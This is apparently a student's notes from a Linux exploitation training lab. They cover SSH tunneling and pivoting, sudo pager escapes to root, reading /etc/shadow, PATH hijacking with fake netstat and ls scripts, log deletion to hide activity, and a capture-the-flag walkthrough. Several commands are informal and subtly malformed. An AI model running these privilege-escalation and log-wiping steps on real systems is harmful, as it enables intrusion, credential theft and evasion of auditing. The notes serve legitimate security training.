## LINUX EXPLOITATION NOTES ##

#from Op station
student@lin-ops:~$ ssh student@10.50.23.132 -L 36363:10.10.28.42:22

#from Op station
ssh demo1@localhost -p 36363

``` 

#### When you get the error ####

student@lin-ops:~$ ssh demo1@localhost -p 36363
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ECDSA key sent by the remote host is
SHA256:y1UpQ3hpzNO/zffZwT7wlBmGIhP5vKMvxMWofPseZCQ.
Please contact your system administrator.
Add correct host key in /home/student/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /home/student/.ssh/known_hosts:9
  remove with:
  ssh-keygen -f "/home/student/.ssh/known_hosts" -R "[localhost]:36363"
ECDSA host key for [localhost]:36363 has changed and you have requested strict checking.
Host key verification failed.
student@lin-ops:~$ ssh-keygen -f "/home/student/.ssh/known_hosts" -R "[localhost]:36363"


# Host [localhost]:36363 found: line 9
/home/student/.ssh/known_hosts updated.
Original contents retained as /home/student/.ssh/known_hosts.old
student@lin-ops:~$ ssh demo1@localhost -p 36363

```

########## OR ###################
#from Op station
ssh student@<JMP_IP> -D 9050
#from Op station
proxychains ssh demo1@10.10.28.42


What are sudoers????? -> ???


#### How to cat /etc/sudoers ####
sudo apt-get changelog apt
!/bin/bash
whoami -> displays root access... 
cat /etc/sudoers

%sudo	ALL=(ALL:ALL) ALL -> 

#### Gets keys ####

demo2@stu:~$ `sudo cat /var/log/syslog* /etc/shadow`

student@lin-ops:~$ `ps elf | grep ping`

student@lin-ops:~$ `ping 8.8.8.8`

demo2@stu:~$ `ls -lisa /bin/ping`
    109 64 -rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
    s means it's going to execute ping as root. 
    other uses in the root group are not allowed to overwrite this file. 
    as demo 2 you can execute this file but not read it's contents. 
    When ping executes it needs root privileges to send ICMP packets. 

find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files
    4000 results to whatever??????

1st thing to look for in a file to see if it's malicious... 
    There should not be a su elevated in a temp folder!!

https://gtfobins.github.io/ -> site to find vulnerabilities...     

Run this command and compare it to a known good... like compare linops results with demo2 ....

find / -type f -perm /4000 -ls 2>/dev/null

demo2@stu:~$ netstat -tunap # if you don't see a PID then it means that its being run as sudo

demo2@stu:~$ netstat_natpu  # now shows connections 

demo2@stu:~$ strings /bin/nestat_natpu | grep netstat # check if it executes netstat

This gives -> netstat -antpu -> which means they are not using an absolute path. 

#### Insecure Permissions ####

student@lin-ops:~$ which ls -> tells you where a particular command is installed.. 

student@lin-ops:~$ echo $PATH
/home/student/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin


echo -e '#!/bin/sh\n\bin/bash -i' > netstat # Creates a netstat script. 

demo2@stu:~$ chmod +x netstat # Give executes permissions

demo2@stu:~$ ls -la netstat

demo2@stu:~$ PATH=.:$PATH # prepending an extra entity that creates a . in the path vulnerability 

demo2@stu:~$ netstat_natpu # running this then runs our netstat command as root.

demo2@stu:~$ ls -la /

total 96
drwxr-xr-x  23 root root  4096 Dec 30 03:04 .
drwxr-xr-x  23 root root  4096 Dec 30 03:04 ..
drwxr-xr-x   2 root root  4096 Dec 30 03:03 bin
drwxr-xr-x   4 root root  4096 Dec 30 03:04 boot
drwxr-xr-x  17 root root  3740 Dec 30 02:36 dev                                                     # contains device files or special device files e.g. /dev/null
drwxr-xr-x  90 root root  4096 Dec 30 03:04 etc                                                     # if you find .conf files, CHECK THEM HOW
drwxr-xr-x   5 root root  4096 Apr 11  2022 home                                                    # Stores all the user information
lrwxrwxrwx   1 root root    34 Dec 30 03:04 initrd.img -> boot/initrd.img-4.15.0-213-generic
lrwxrwxrwx   1 root root    33 Mar  4  2020 initrd.img.old -> boot/initrd.img-4.15.0-88-generic
drwxr-xr-x  20 root root  4096 Dec 30 03:01 lib                                                     # Stores libraries, some of them needed for boot. All sorts of 
drwxr-xr-x   2 root root  4096 Dec 30 02:55 lib64                                                   # Stores 64 bit programs
drwx------   2 root root 16384 Mar  4  2020 lost+found                                              # Stores recovery for file systems
drwxr-xr-x   2 root root  4096 Mar  4  2020 media                                                   # Used for repositories e.g. for installation
drwxr-xr-x   2 root root  4096 Mar  4  2020 mnt                                                     # mounting point
drwxr-xr-x   3 root root  4096 Apr 11  2022 opt                                                     #
dr-xr-xr-x 106 root root     0 Dec 30 02:36 proc                                                    # all 3rd part things e.g docker and what not
drwx------   5 root root  4096 Apr 11  2022 root                                                    #
drwxr-xr-x  26 root root   980 Jan 12 13:46 run                                                     # used to store temporary runtime files and state information       needed during the system's operation
drwxr-xr-x   2 root root 12288 Dec 30 03:01 sbin                                                    # Admin
drwxr-xr-x   2 root root  4096 Apr 11  2022 snap                                                    # Snap packages. Snap is a package management and software distribution system developed by Canonical, the company behind Ubuntu Linux. 
drwxr-xr-x   2 root root  4096 Mar  4  2020 srv                                                     #  is intended for site-specific data that is served by the system. 
                                                                                                    It is typically used to store data and files related to services, 
                                                                                                    applications, or websites hosted on the system. 

dr-xr-xr-x  13 root root     0 Dec 30 02:36 sys                                                      # A virtual filesystem that provides a way to interact with 
                                                                                                    the kernel and access various kernel parameters and configuration settings.

drwxrwxrwt  13 root root  4096 Jan 12 14:58 tmp                                                      # serves as a temporary storage location for files and data that
                                                                                                    are meant to be used temporarily and are subject to automatic 
                                                                                                    deletion. One place where all uses have write and execute permissions.
                                                                                                    Very useful for places you have restriction access.



drwxr-xr-x  10 root root  4096 Mar  4  2020 usr                                                     # Used for user installed programs. 
drwxr-xr-x  13 root root  4096 Mar  4  2020 var                                                     # contains variable data that can change during the system's operation.
lrwxrwxrwx   1 root root    31 Dec 30 03:04 vmlinuz -> boot/vmlinuz-4.15.0-213-generic
lrwxrwxrwx   1 root root    30 Mar  4  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-88-generic

`find / -name "cron*" 2>/dev/null` Find all crontab jobs
root@stu:~# `cat /var/spool/cron/crontabs/root`???? What file did he edit for this guy?
Anacron is about sleep

root@stu:~# `uname -r ` Gives the kernel version that is running. 
4.15.0-88-generic


Auditing SystemV
ausearch: Pulls from audit.log
`ausearch -p 22`
`ausearch -m USER_LOGIN -sv no`
`ausearch -ua edwards -ts yesterday -te now -i`

SystemD
`Utilzes journalctl`
`journalctl _TRANSPORT=audit`
`journalctl _TRANSPORT=audit | grep 603`

Working With Logs
`file /var/log/wtmp`
`find /var/log -type f -mmin -10 2> /dev/null`
`journalctl -f -u ssh`
`journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4`

Reading Files
`cat /var/log/auth.log | egrep -v "opened|closed"`
`awk '/opened/' /var/log/auth.log`
`last OR lastb OR lastlog`
`strings OR dd`            # for data files
`more /var/log/syslog`
`head/tail`
Control your output with pipes | and more

Cleaning The Logs
Before we start cleaning, save the INODE!

Affect on the inode of using mv VS cp VS cat

Know what we are removing (Entry times? IP? Whole file? Etc.)

Cleaning The Logs (Basic)
Get rid of it

`rm -rf /var/log/...`
Clear It

`cat /dev/null > /var/log/...`
`echo > /var/log/...`

Rsyslog
Newer Rsyslog references `/etc/rsyslog.d/*` for settings/rules

Older version only uses `/etc/rsyslog.conf`

Find out grep `"IncludeConfig" /etc/rsyslog.conf`

Rsyslog Examples
kern.*                                                # All kernel messages, all severities
mail.crit
cron.!info,!debug
*.*  @192.168.10.254:514                                                     # Old format All logs
*.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
#mail.*















![Alt Text](linux_exploitation_images/image_01.png)

1. Using the contents of the "rsyslog2.conf" file as an example:

True/False: If this file were named /etc/rsyslog.conf, would the configuration be a concern for us if we gained accessed through secure shell?

To successfully answer the challenge, provide a T or F (capitalized)

T because while custom configuration data is in /etc/rsyslog.conf

2. Using the contents of the "rsyslog2.conf" file as an example:

Which rule will send a message to any logged in user?

To answer challenge successfully provide the facility.priority of the rule.

Example: mail.debug

*.emerg

# Everybody gets emergency messages

3. Using the "rsyslog2.conf" file.

Which active rule or rules is using a abnormal logging location?

To successfully complete the challenge provide the rule facility.priority.Example: mail.debug

local7.alert

#/var/log/wtmp(x) = Provides a permanent historical record of each time a user logged in and out, and system boots, reboots, and shutdowns in binary format.

4. Using the "rsyslog2.conf" file.

What priority level will user facility log?

To successfully complete the challenge provide the rule severity level.

![Alt Text](linux_exploitation_images/image_02.png)

0 = emergency

5. Using the "rsyslog2.conf" file.

Is remote logging enabled?To successfully complete the challenge provide a Y or N (capitalized)

Y # *.* @@192.0.2.1:13232 = this identifies all facilities and severity messages to a remote logging server

6. Using the "rsyslog2.conf" file.

What servers could this system send logs to? (also consider commented entries)

192.0.2.1 193.0.12.1 193.0.42.1

![Alt Text](linux_exploitation_images/image_03.png)

7. Using the "rsyslog2.conf" file.

What transport layer protocol does @@ utilize for communications when remote logging?

port 13232 == TCP

8. Using the "rsyslog2.conf" file.

Which rules are inactive, what are their facilities?

Rules has # making them inactive

![Alt Text](linux_exploitation_images/image_04.png)

9. There is a user on the system with the ability to sudo certain programs that has a '.' dot in their path and is navigating to and listing the contents of common world writable directories approximately every five minutes.

The user's script is running like this:

cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls

The flag is located in this users home directory.

Step 1: Create a local Tunnel from lin-ops to Pivot (192.168.28.105)

student@lin-ops:~$ ssh student@10.50.33.231 -L 50511:192.168.28.105:2222 -NT

Step 2: Create a Dynamic to Pivot

student@lin-ops:~$ ssh comrade@localhost -p 50511 -D 9050 –NT

Step 3: Scan the target T1 for opem ports

student@lin-ops:~$ proxychains nmap -Pn 192.168.28.27 -p 1-5000

![Alt Text](linux_exploitation_images/image_05.png)

Step 4: Create a tunnel from lin-ops to T1

student@lin-ops:~$ ssh comrade@localhost -p 50511 -L 50522:192.168.28.27:22 -NT

Step 5: ssh to T1

student@lin-ops:~$ ssh comrade@localhost -p 50522

Step 6: Go to cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls

![Alt Text](linux_exploitation_images/image_06.png)

Step 7: Here we are not able to read the files above. But the current user comrade@lin2 has “.” on directory which makes any script we put on that directory executable.

Create a Script:

`nano ls`

`!/bin/bash`

#script that sends information to a remote system.

`cat /etc/passwd > /tmp/test1.txt`

Here, this script is readin /etc/passwd and sending it to the /tmp directory to a file test2.txt

Do the same on /var/tmp direcotory as well

`nano ls`

Step 8: go back to /tmp directory and read the test1.txt file

![Alt Text](linux_exploitation_images/image_07.png)

Step 9: we need to identify who is running this scrip so change the nano ls on both directories

`nano ls`

`!/bin/bash`

#script that sends information to a remote system.

`whoami > /tmp/test1.txt`

And read the test1.txt file

![Alt Text](linux_exploitation_images/image_08.png)

Step 10: we know billybob is running the file

Step 11: Now, we need to figure out password for billybob -----

Nano

#!/bin/bash

# script that sends information to a remote system

/bin/ls /home/billybob > /tmp/test1.txt

Step 12: cat test1.txt

Note: watch “test1.txt” #this will run the file every 2 second

![Alt Text](linux_exploitation_images/image_09.png)

10. A command this user is able to sudo can be abused to obtain access as another user. This may take some research and effort to obtain root access with it.

It is possible that your initial user does not have sudo privileges and that you will need to move laterally to another account.

The flag can be found under the root profile directory










REVIEWS -> 
Sometimes the instructor  was way too fast to follow 